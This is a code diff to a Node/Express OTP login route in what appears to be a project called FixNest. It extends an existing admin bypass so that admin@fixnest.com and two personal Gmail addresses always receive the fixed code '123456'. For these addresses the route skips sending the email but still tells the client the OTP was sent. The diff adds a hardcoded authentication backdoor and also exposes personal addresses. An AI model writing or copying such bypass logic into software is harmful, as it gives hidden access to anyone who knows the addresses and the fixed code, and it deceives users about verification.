@@ -40,7 +40,8 @@ router.post('/send-otp', [
     }
 
     // Generate 6-digit OTP (Fixed for admin)
-    const otpCode = email === 'admin@fixnest.com' ? '123456' : Math.floor(100000 + Math.random() * 900000).toString();
+    const bypassEmails = ['admin@fixnest.com', 'ak.akramhossain001@gmail.com', 'akakramhossain001@gmail.com'];
+    const otpCode = bypassEmails.includes(email) ? '123456' : Math.floor(100000 + Math.random() * 900000).toString();
     const expiresAt = new Date(Date.now() + 5 * 60 * 1000); // 5 minutes
 
     // Upsert OTP in DB
@@ -50,7 +51,7 @@ router.post('/send-otp', [
       create: { email, code: otpCode, expiresAt }
     });
 
-    if (email === 'admin@fixnest.com') {
+    if (bypassEmails.includes(email)) {
       console.log(`[OTP] Admin login bypass. Code is 123456`);
       return res.json({ message: 'OTP sent successfully to your email.' });
     }
